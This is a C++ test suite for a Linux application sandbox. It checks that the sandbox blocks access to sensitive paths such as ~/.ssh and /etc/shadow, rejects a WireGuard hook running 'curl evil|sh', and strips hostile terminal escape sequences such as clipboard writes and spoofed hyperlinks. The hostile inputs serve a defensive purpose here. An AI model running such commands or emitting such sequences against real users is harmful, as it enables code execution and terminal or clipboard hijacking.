// Minimal dependency-free test runner.
#include <cstdio>
#include <functional>
#include <unistd.h>

#include "core/plan.hpp"
#include "core/elf.hpp"
#include "core/libs.hpp"
#include "core/launch.hpp"
#include "core/seccomp.hpp"
#include "core/bundle.hpp"
#include "ui/display.hpp"
#include "ui/termfilter.hpp"
#include "net/netns.hpp"
#include "util/sys.hpp"

using namespace hf;

static int g_fail = 0, g_run = 0;
#define CHECK(c) do { ++g_run; if (!(c)) { ++g_fail; std::printf("  FAIL %s:%d: %s\n", __FILE__, __LINE__, #c); } } while (0)
#define THROWS(T, expr) do { ++g_run; bool t_ = false; try { expr; } catch (const T&) { t_ = true; } catch (...) {} \
    if (!t_) { ++g_fail; std::printf("  FAIL %s:%d: expected %s from %s\n", __FILE__, __LINE__, #T, #expr); } } while (0)
static void test(const char* n, const std::function<void()>& f) { std::printf("* %s\n", n); f(); }

static User fake_user() {
    User u; u.uid = 1000; u.gid = 1000; u.name = "alice"; u.home = "/home/alice"; u.runtime_dir = "/run/user/1000";
    return u;
}
static bool has_seq(const Strings& v, std::initializer_list<std::string> seq) {
    for (size_t i = 0; i + seq.size() <= v.size(); ++i) {
        size_t j = 0; bool ok = true;
        for (auto& s : seq) { if (v[i + j] != s) { ok = false; break; } ++j; }
        if (ok) return true;
    }
    return false;
}

int main() {
    test("split_words", [] {
        CHECK((split_words("a b  c") == Strings{"a", "b", "c"}));
        CHECK((split_words("librewolf --profile '/tmp/my lw' \"x y\"") == Strings{"librewolf", "--profile", "/tmp/my lw", "x y"}));
        CHECK((split_words("a \"\" b") == Strings{"a", "", "b"}));
        THROWS(Error, split_words("a 'b"));
    });

    test("path_under / norm", [] {
        CHECK(path_under("/home/a/.ssh/id", "/home/a/.ssh"));
        CHECK(path_under("/home/a/.ssh", "/home/a/.ssh"));
        CHECK(!path_under("/home/a/.sshx", "/home/a/.ssh"));
        CHECK(!path_under("/home", "/home/a"));
        CHECK(path_under("/home/a/../a/x/", "/home/a"));
    });

    test("profile parser", [] {
        Profile p = parse_profile("[profile]\nname=x\ncommand = a 'b c'  # trailing\nmode=bundle\n[fs]\nro_try = /a => /b\nrw = $HOME/p\n"
                                  "[env]\nset = K=V=W\n[network]\nmode=ivpn\nsubnet=7\n[bundle]\nprovision = echo a#b\n", "t");
        CHECK(p.root == RootMode::Bundle);
        CHECK((p.command == Strings{"a", "b c"}));
        CHECK(p.mounts.size() == 2 && p.mounts[0].optional && !p.mounts[0].rw && p.mounts[0].dst == "/b" && p.mounts[1].rw);
        CHECK(p.env_set.at(0).second == "V=W");
        CHECK(p.net == NetMode::Ivpn && p.subnet_octet == 7);
        CHECK(p.provision.at(0) == "echo a#b");
        THROWS(ProfileError, parse_profile("[profile]\nbogus=1\n", "t"));
        THROWS(ProfileError, parse_profile("[nope]\na=1\n", "t"));
        THROWS(ProfileError, parse_profile("a=1\n", "t"));
        THROWS(ProfileError, parse_profile("[profile]\nmode=maybe\n", "t"));
        THROWS(ProfileError, parse_profile("[network]\nsubnet=300\n", "t"));
    });

    test("expand", [] {
        User u = fake_user(); VarCtx c; c.user = &u;
        CHECK(expand("~/x", c) == "/home/alice/x");
        CHECK(expand("$HOME/${USER}/$UID", c) == "/home/alice/alice/1000");
        THROWS(ProfileError, expand("$NOPE/x", c));
    });

    test("policy: blacklist and sensitive roots", [] {
        User u = fake_user();
        Policy p(u, {"/data/secret"});
        THROWS(PolicyError, p.check_bind("/home/alice", true));          // $HOME itself
        THROWS(PolicyError, p.check_bind("/home", false));
        THROWS(PolicyError, p.check_bind("/", false));
        THROWS(PolicyError, p.check_bind("/home/alice/.ssh", false));    // denied
        THROWS(PolicyError, p.check_bind("/home/alice/.ssh/id_ed25519", false));
        THROWS(PolicyError, p.check_bind("/home/alice/.config/BraveSoftware/x", false));
        THROWS(PolicyError, p.check_bind("/data/secret/k", false));      // user deny
        THROWS(PolicyError, p.check_bind("/etc/shadow", false));
        THROWS(PolicyError, p.check_bind("/home/alice/.config/wssch", false));
        THROWS(PolicyError, p.check_bind("/home/alice/.local/share/holdfast/profiles", false));
        THROWS(PolicyError, p.check_bind("/run/user/1000/docker.sock", false));
        THROWS(PolicyError, p.check_bind("/usr/lib/x", true));           // rw into system
        THROWS(PolicyError, p.check_bind("/run/media/alice/USB", true)); // removable-media root
        p.check_bind("/home/alice/Projects/foo", true);                  // fine
        p.check_bind("/usr/lib", false);
        p.check_bind("/run/media/alice/USB/work", true);
        THROWS(PolicyError, p.check_cwd("/home/alice"));
    });

    test("policy: ancestor exposure is refused only when the denied path exists", [] {
        char tmpl[] = "/tmp/hf-pol-XXXXXX";
        std::string d = mkdtemp(tmpl);
        fs::create_directories(d + "/home/.ssh");
        User u = fake_user(); u.home = d + "/home";
        Policy p(u, {});
        THROWS(PolicyError, p.check_bind(d + "/home/.ssh", false));
        fs::remove_all(d);
    });

    test("policy: symlink to denied path is resolved", [] {
        char tmpl[] = "/tmp/hf-sym-XXXXXX";
        std::string d = mkdtemp(tmpl);
        fs::create_directories(d + "/home/.gnupg");
        fs::create_directories(d + "/home/proj");
        fs::create_symlink(d + "/home/.gnupg", d + "/home/proj/link");
        User u = fake_user(); u.home = d + "/home";
        Policy p(u, {});
        THROWS(PolicyError, p.check_bind(d + "/home/proj/link", false));
        fs::remove_all(d);
    });

    test("wireguard config parsing", [] {
        WgInfo w = parse_wg_conf("[Interface]\nPrivateKey = k\nAddress = 10.0.0.2/32\nDNS = 10.0.254.1, 10.0.254.2\n"
                                 "[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\nEndpoint = 198.51.100.7:2049\n");
        CHECK(w.endpoint_ip == "198.51.100.7" && w.endpoint_port == 2049);
        CHECK((w.dns == Strings{"10.0.254.1", "10.0.254.2"}));
        CHECK(w.sanitized.find("DNS") == std::string::npos);
        CHECK(w.sanitized.find("PrivateKey") != std::string::npos);
        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = vpn.example.com:51820\n"));
        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = [::1]:51820\n"));
        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = 1.2.3.4:99999\n"));
        THROWS(ProfileError, parse_wg_conf("[Interface]\nPostUp = curl evil|sh\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
        THROWS(ProfileError, parse_wg_conf("[Interface]\npostdown=x\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
        THROWS(ProfileError, parse_wg_conf("[Interface]\nTable = off\n[Peer]\nEndpoint = 1.2.3.4:1\n"));
        THROWS(ProfileError, parse_wg_conf("[Peer]\nEndpoint = 1.2.3.4:1\n[Peer]\nEndpoint = 5.6.7.8:1\n"));
        THROWS(ProfileError, parse_wg_conf("[Interface]\nPrivateKey=k\n"));
    });

    test("netns naming", [] {
        CHECK(valid_ns_name("hf-librewolf"));
        CHECK(!valid_ns_name("hf-"));
        CHECK(!valid_ns_name("../etc"));
        CHECK(!valid_ns_name("hf-a b"));
        CHECK(!valid_ns_name("ivpn"));
        int o = derive_octet("hf-librewolf");
        CHECK(o >= 1 && o <= 254 && o == derive_octet("hf-librewolf"));
    });

    test("git entries: dirs and files, no descent", [] {
        char tmpl[] = "/tmp/hf-git-XXXXXX";
        std::string d = mkdtemp(tmpl);
        fs::create_directories(d + "/.git/modules/.git");   // nested inside a match: must NOT be reported
        fs::create_directories(d + "/a/b/.git");
        fs::create_directories(d + "/wt");
        write_file(d + "/wt/.git", "gitdir: /x\n", 0644);   // worktree/submodule style file
        auto g = find_git_entries(d);
        CHECK(g.size() == 3);
        fs::remove_all(d);
    });

    test("git entries: fail closed", [] {
        char tmpl[] = "/tmp/hf-git2-XXXXXX";
        std::string d = mkdtemp(tmpl);
        fs::create_directories(d + "/a/.git");
        fs::create_directories(d + "/b/.git");
        THROWS(Error, find_git_entries(d, 1));                     // cap exceeded must not truncate silently
        fs::create_directories(d + "/c");
        fs::create_symlink("/home", d + "/c/.git");
        THROWS(PolicyError, find_git_entries(d));                  // symlinked .git is refused
        fs::remove_all(d);
    });

    test("secure dir", [] {
        char tmpl[] = "/tmp/hf-sec-XXXXXX";
        std::string d = mkdtemp(tmpl);
        make_secure_dir(d + "/ok");
        CHECK((fs::status(d + "/ok").permissions() & fs::perms::others_all) == fs::perms::none);
        fs::create_directories(d + "/real");
        fs::create_symlink(d + "/real", d + "/link");
        THROWS(Error, make_secure_dir(d + "/link"));               // pre-planted symlink
        fs::remove_all(d);
    });

    test("clipboard sanitize", [] {
        CHECK(sanitize_clipboard("a\tb\nc") == "a\tb\nc");
        CHECK(sanitize_clipboard("x\x1b[31my\rz\x7f") == "x[31myz");
        CHECK(sanitize_clipboard("p\xC2\x9Bq") == "pq");                   // C1 CSI
        CHECK(sanitize_clipboard("a\xE2\x80\xAE" "b") == "ab");               // RLO
        CHECK(sanitize_clipboard("caf\xC3\xA9 \xE2\x82\xAC") == "caf\xC3\xA9 \xE2\x82\xAC");   // normal UTF-8 untouched
        CHECK(parse_profile("[profile]\nname=t\ncommand=sh\n[clipboard]\nmode=out\n", "t").clipboard_sanitize);
        CHECK(!parse_profile("[profile]\nname=t\ncommand=sh\n[clipboard]\nmode=out\nsanitize=no\n", "t").clipboard_sanitize);
    });

    test("profile: pasta, libs, seccomp keys", [] {
        Profile d = parse_profile("[profile]\nname=t\ncommand=sh\n", "t");
        CHECK(d.libs == LibsMode::Minimal && d.seccomp == "default" && d.net == NetMode::None);
        Profile p = parse_profile("[profile]\nname=t\ncommand=sh\nseccomp=none\n[fs]\nlibs=full\n[network]\nmode=pasta\n", "t");
        CHECK(p.libs == LibsMode::Full && p.seccomp == "none" && p.net == NetMode::Pasta);
        THROWS(ProfileError, parse_profile("[profile]\nname=t\ncommand=sh\n[fs]\nlibs=yes\n", "t"));
        CHECK(d.terminal == TermMode::Filter);
        CHECK(parse_profile("[profile]\nname=t\ncommand=sh\nterminal=passthrough\n", "t").terminal == TermMode::Passthrough);
        THROWS(ProfileError, parse_profile("[profile]\nname=t\ncommand=sh\nterminal=raw\n", "t"));
    });

    test("elf: DT_NEEDED of this very binary", [] {
        auto e = read_elf_deps(fs::canonical("/proc/self/exe"));
        CHECK(e.has_value());
        if (e) {
            CHECK(!e->interp.empty() || !e->needed.empty());
            bool libc = false;
            for (auto& n : e->needed) if (n.rfind("libc.", 0) == 0) libc = true;
            CHECK(libc);
        }
        char tmpl[] = "/tmp/hf-elf-XXXXXX";
        std::string d = mkdtemp(tmpl);
        write_file(d + "/script", "#!/bin/sh\n", 0755);
        CHECK(!read_elf_deps(d + "/script").has_value());          // scripts are not ELF
        fs::remove_all(d);
    });

    test("minimal libs: toolchains need libs = full", [] {
        User u = fake_user();
        Policy pol(u, {});
        THROWS(Error, resolve_minimal_libs({{"gcc", "/usr/bin/gcc"}}, pol));
    });

    test("seccomp denylist", [] {
        const Strings& d = seccomp_denylist();
        auto has = [&](const char* n) { for (auto& x : d) if (x == n) return true; return false; };
        CHECK(has("bpf") && has("mount") && has("io_uring_setup") && has("keyctl"));
        CHECK(!has("clone3") && !has("clone") && !has("unshare") && !has("ptrace"));   // see seccomp.cpp
#ifdef HOLDFAST_HAVE_SECCOMP
        char tmpl[] = "/tmp/hf-sc-XXXXXX";
        std::string dir = mkdtemp(tmpl);
        write_default_seccomp(dir + "/f.bpf");
        auto sz = fs::file_size(dir + "/f.bpf");
        CHECK(sz > 0 && sz % 8 == 0);                              // array of 8-byte sock_filter instructions
        fs::remove_all(dir);
#else
        THROWS(Error, write_default_seccomp("/tmp/never"));
#endif
    });

    test("terminal filter: allowlist passes what TUIs need", [] {
        auto f = [](const std::string& in) { TermFilter t; return t.feed(in); };
        for (const char* ok : {"hello\r\n\t\033[1;31mred\033[0m", "\033[1;38;2;1;2;3mx\033[4:3mu\033[0m", "\033[?1049h\033[2J\033[H\033[?1049l",
                               "\033[?1000;1006h\033[?2004h\033[?25l\033[?25h", "\033(0lqk\033(B", "caf\303\251 \342\202\254",
                               "\033[6n\033[c\033[>q\033[?u\033[5 q\033[?2004$p", "\033[3;10r\033[2K\033[10;5H\033[2S\033M\0337\0338"})
            CHECK(f(ok) == ok);
        CHECK(f("\033]11;?\007") == "\033]11;?\033\\");
        TermFilter split;                                              // state survives chunk boundaries
        std::string o = split.feed("a\033]5");
        o += split.feed("2;c;eA\007x");
        CHECK(o == "ax");
    });

    test("terminal filter: hostile sequences are dropped", [] {
        auto f = [](const std::string& in) { TermFilter t; return t.feed(in); };
        CHECK(f("a\033]52;c;Zm9v\007b") == "ab");                          // OSC 52 clipboard write (BEL)
        CHECK(f("a\033]52;c;Zm9v\033\\b") == "ab");                        // ... (ST)
        CHECK(f("\033]8;;http://evil\033\\click\033]8;;\033\\") == "click");   // hyperlink spoofing
        CHECK(f("\033]2;sudo password:\007") == "\033]2;[sandbox] sudo password:\033\\");
        CHECK(f("\033]0;a\nb\033\\") == "\033]2;[sandbox] ab\033\\");      // control chars stripped from titles
        CHECK(f("\033]4;1;rgb:00/00/00\007\033]10;rgb:00/00/00\007") == "");   // setting colours could hide text
        CHECK(f("\033[21t\033[8;100;300t\033[22;0t") == "");               // title report (answerback injection), resize, push title
        CHECK(f("a\033P$q\"p\033\\b") == "ab");                            // DCS
        CHECK(f("a\033_Gf=100;AAAA\033\\b") == "ab");                      // APC (kitty graphics)
        CHECK(f("\033Ptmux;\033\033]52;;x\007\033\\") == "");              // tmux passthrough smuggling an OSC 52
        CHECK(f("\033c\033Z\033[?3h\033[2h\033[5i\033%@\033 G") == "");    // RIS, DECID, DECCOLM, keyboard lock, media copy, UTF-8 off, S8C1T
        CHECK(f("a\005b") == "ab");                                        // ENQ (answerback)
        CHECK(f("a\302\233[31mb") == "a[31mb");                            // C1 CSI (U+009B) neutralised, text stays visible
        CHECK(f("a\233b") == "ab");                                        // raw 8-bit CSI
        CHECK(f("\033[1;2;3;4;5;6;7;8;9;10;11;12;13;14;15;16;17;18;19;20;21;22;23;24;25;26;27;28;29;30;31;32;33;34;35;36;37;38;39;40;41;42;43;44;45;46;47;48;49;50;51;52;53;54;55;56;57;58;59;60;61;62;63;64;65m") == "");   // over-long CSI
        std::string flood = "\033P" + std::string(70000, 'x') + "tail";   // an unterminated string must not swallow output forever
        std::string out = f(flood);
        CHECK(out.size() >= 4 && out.compare(out.size() - 4, 4, "tail") == 0);
    });

    test("terminal filter: restore() undoes modes a dead sandbox left on", [] {
        TermFilter t;
        t.feed("\033[?1049h\033[?1000h\033[?1006h\033[?25l\033[?2004h\033[?1h");
        std::string r = t.restore();
        for (const char* want : {"\033[?1000l", "\033[?1006l", "\033[?2004l", "\033[?1l", "\033[?25h", "\033[?1049l", "\033[0m"})
            CHECK(r.find(want) != std::string::npos);
        TermFilter clean;
        clean.feed("\033[?1049h\033[?1049l\033[?25l\033[?25h");
        CHECK(clean.restore().find("1049") == std::string::npos && clean.restore().find("25") == std::string::npos);
    });

    test("bundle sharing: layout and integrity", [] {
        User u = fake_user();
        Paths a = make_paths(u, "one", "alpine-dev"), b = make_paths(u, "two", "alpine-dev"), c = make_paths(u, "three");
        CHECK(a.rootfs == b.rootfs && a.home != b.home);                       // userland shared, $HOME never
        CHECK(c.bundle.filename() == "three");                                  // default id = profile name
        THROWS(Error, make_paths(u, "x", "../escape"));
        THROWS(ProfileError, parse_profile("[bundle]\nid = ../x\n", "t"));
        const char* base = "[profile]\nname=t\ncommand=sh\n[bundle]\nalpine_version=3.24.3\n";
        Profile p = parse_profile(base, "t");
        Profile q = parse_profile(std::string(base) + "packages = git\nprovision = echo hi\n", "t");
        Profile r = parse_profile("[profile]\nname=t\ncommand=sh\n[bundle]\nalpine_version=3.23.0\n", "t");
        CHECK(bundle_spec(p) == bundle_spec(q) && bundle_spec(p) != bundle_spec(r));   // packages/provision are additive, version is not
        char tmpl[] = "/tmp/hf-bun-XXXXXX";
        std::string d = mkdtemp(tmpl);
        Paths bp = a; bp.bundle = d;
        write_file(d + "/spec.stamp", bundle_spec(p) + "\n", 0600);
        write_file(d + "/tarball.sha256", std::string(64, 'a') + "\n", 0600);
        bundle_verify(p, bp);                                                   // same spec: fine
        THROWS(Error, bundle_verify(r, bp));                                    // another profile sharing the id with a different version
        Profile pinned = parse_profile(std::string(base) + "alpine_sha256 = " + std::string(64, 'b') + "\n", "t");
        write_file(d + "/spec.stamp", bundle_spec(pinned) + "\n", 0600);
        THROWS(Error, bundle_verify(pinned, bp));                               // pins a different tarball than the one installed
        fs::remove_all(d);
    });

    test("xauth file format", [] {
        char tmpl[] = "/tmp/hf-xa-XXXXXX";
        std::string d = mkdtemp(tmpl);
        write_xauth(d + "/x", "91", std::string(16, 'A'));
        std::string s = read_file(d + "/x");
        CHECK(s.size() == 2 + 2 + 2 + 2 + 2 + 18 + 2 + 16);
        CHECK((unsigned char)s[0] == 0xff && (unsigned char)s[1] == 0xff);   // FamilyWild
        CHECK(s.substr(6, 2) == "91");
        fs::remove_all(d);
    });

    test("plan: isolation invariants (host mode)", [] {
        char tmpl[] = "/tmp/hf-plan-XXXXXX";
        std::string d = mkdtemp(tmpl);
        User u = fake_user(); u.home = d + "/home"; fs::create_directories(u.home);
        u.runtime_dir = d + "/run";
        Policy pol(u, {});
        Profile p = parse_profile("[profile]\nname=t\ncommand=sh\n[bin]\nallow = sh\n[fs]\nlibs=full\n[home]\nuser=box\n", "t");
        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.data = d + "/data"; c.paths.home = d + "/data/home";
        c.policy = &pol; c.session = d + "/sess"; fs::create_directories(c.session);
        Plan pl = build_plan(p, c);
        const Strings& a = pl.b.args();
        CHECK(has_seq(a, {"--unshare-all"}));
        CHECK(has_seq(a, {"--cap-drop", "ALL"}));
        CHECK(has_seq(a, {"--die-with-parent"}));
        CHECK(has_seq(a, {"--clearenv"}));
        CHECK(!has_seq(a, {"--share-net"}));                       // network none by default
        CHECK(!has_seq(a, {"--ro-bind", "/", "/"}));                // never whole host
        CHECK(!has_seq(a, {"--dev-bind"}));
        CHECK(has_seq(a, {"--ro-bind", c.session.string() + "/passwd", "/etc/passwd"}));
        CHECK(has_seq(a, {"--setenv", "HOME", "/home/box"}));
        CHECK((pl.b.cmd() == Strings{"sh"}));
        for (size_t i = 0; i + 2 < a.size(); ++i)                   // host /etc/passwd must never be bound
            if (a[i] == "--ro-bind" || a[i] == "--bind") CHECK(a[i + 1] != "/etc/passwd");
        // network on => share-net + resolv.conf; ivpn goes through the same path
        c.network = true;
        Plan pl2 = build_plan(p, c);
        CHECK(has_seq(pl2.b.args(), {"--share-net"}));
        CHECK(has_seq(pl2.b.args(), {"--ro-bind", "/etc/resolv.conf", "/etc/resolv.conf"}));
        CHECK(!has_seq(pl2.b.args(), {"--uid"}));
        CHECK(has_seq(a, {"--ro-bind", "/usr/lib", "/usr/lib"}));    // libs = full above binds the directories
        // libs = minimal: exactly the [libs] list, and an empty list with binaries is an error
        std::string lib = d + "/libfoo.so.1";
        write_file(lib, "x", 0644);
        Profile m = parse_profile("[profile]\nname=t\ncommand=sh\n[bin]\nallow = sh\n[libs]\nbind = " + lib + "\n[home]\nuser=box\n", "t");
        Plan pm = build_plan(m, c);
        CHECK(has_seq(pm.b.args(), {"--ro-bind", fs::canonical(lib).string(), lib}));
        CHECK(!has_seq(pm.b.args(), {"--ro-bind", "/usr/lib", "/usr/lib"}));
        Profile e = parse_profile("[profile]\nname=t\ncommand=sh\n[bin]\nallow = sh\n[home]\nuser=box\n", "t");
        THROWS(ProfileError, build_plan(e, c));
        THROWS(ProfileError, parse_profile("[libs]\nbind = relative/path\n", "t"));
#ifdef HOLDFAST_HAVE_SECCOMP
        CHECK(pl.seccomp == c.session / "seccomp.bpf" && fs::exists(pl.seccomp));
#endif
        CHECK(has_seq(a, {"--new-session"}));                       // no pty proxy: bwrap starts a new session
        c.pty_proxy = true;                                         // pty proxy: the sandbox's tty is the pty; a second setsid would fail
        CHECK(!has_seq(build_plan(p, c).b.args(), {"--new-session"}));
        c.pty_proxy = false;
        // pasta: its own resolv.conf (a host stub on 127.0.0.x would be unreachable) and a pinned uid/gid
        c.pasta = true;
        Plan pl3 = build_plan(p, c);
        CHECK(has_seq(pl3.b.args(), {"--ro-bind", c.session.string() + "/resolv.conf", "/etc/resolv.conf"}));
        CHECK(has_seq(pl3.b.args(), {"--uid", "1000", "--gid", "1000"}));
        CHECK(read_file(c.session / "resolv.conf") == pasta_resolv_conf());
        Strings pa = pasta_argv("/usr/bin/pasta", {"sh", "-c", "x"});
        CHECK(has_seq(pa, {"-T", "none", "-U", "none"}) && has_seq(pa, {"--no-map-gw"}) && has_seq(pa, {"--", "sh", "-c", "x"}));
        fs::remove_all(d);
    });

    test("plan: policy blocks dangerous user mounts", [] {
        char tmpl[] = "/tmp/hf-plan2-XXXXXX";
        std::string d = mkdtemp(tmpl);
        User u = fake_user(); u.home = d + "/home"; fs::create_directories(u.home / ".ssh");
        u.runtime_dir = d + "/run";
        Policy pol(u, {});
        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.home = d + "/h"; c.policy = &pol;
        c.session = d + "/s"; fs::create_directories(c.session);
        Profile p = parse_profile("[profile]\ncommand=sh\n[fs]\nro = " + u.home.string() + "/.ssh\n", "t");
        THROWS(PolicyError, build_plan(p, c));
        Profile q = parse_profile("[profile]\ncommand=sh\n[home]\nbind = .ssh\n", "t");
        THROWS(PolicyError, build_plan(q, c));
        Profile r = parse_profile("[profile]\ncommand=sh\n[fs]\nrw = /usr/lib\n", "t");
        THROWS(PolicyError, build_plan(r, c));
        fs::remove_all(d);
    });

    test("plan: cwd mount re-binds .git read-only after the rw bind", [] {
        char tmpl[] = "/tmp/hf-plan3-XXXXXX";
        std::string d = mkdtemp(tmpl);
        User u = fake_user(); u.home = d + "/home"; u.runtime_dir = d + "/run";
        fs::create_directories(d + "/proj/.git"); fs::create_directories(d + "/proj/sub/.git");
        Policy pol(u, {});
        PlanCtx c; c.user = u; c.paths = make_paths(u, "t"); c.paths.home = d + "/h"; c.policy = &pol;
        c.session = d + "/s"; fs::create_directories(c.session);
        c.cwd = d + "/proj"; c.mount_cwd = true;
        Profile p = parse_profile("[profile]\ncommand=sh\n", "t");
        Plan pl = build_plan(p, c);
        const Strings& a = pl.b.args();
        auto pos = [&](std::initializer_list<std::string> s) { for (size_t i = 0; i + s.size() <= a.size(); ++i) { size_t j = 0; bool ok = true; for (auto& x : s) { if (a[i + j] != x) { ok = false; break; } ++j; } if (ok) return (long)i; } return -1L; };
        long rw = pos({"--bind", d + "/proj", "/shared"});
        long ro1 = pos({"--ro-bind", d + "/proj/.git", "/shared/.git"});
        long ro2 = pos({"--ro-bind", d + "/proj/sub/.git", "/shared/sub/.git"});
        CHECK(rw >= 0 && ro1 > rw && ro2 > rw);
        // $HOME as working tree is refused outright
        c.cwd = u.home; fs::create_directories(u.home);
        THROWS(PolicyError, build_plan(p, c));
        fs::remove_all(d);
    });

    test("font matching", [] {
        char tmpl[] = "/tmp/hf-font-XXXXXX";
        std::string d = mkdtemp(tmpl);
        fs::create_directories(d + "/truetype/liberation"); fs::create_directories(d + "/TTF"); fs::create_directories(d + "/noto");
        write_file(d + "/truetype/liberation/LiberationSans-Regular.ttf", "x", 0644);
        write_file(d + "/TTF/DejaVuSans.ttf", "x", 0644);
        write_file(d + "/noto/NotoSans.ttf", "x", 0644);
        auto m = match_font_files(d, {"liberation", "dejavu"});
        CHECK(m.size() == 2);
        fs::remove_all(d);
    });

    std::printf("\n%d checks, %d failed\n", g_run, g_fail);
    return g_fail ? 1 : 0;
}
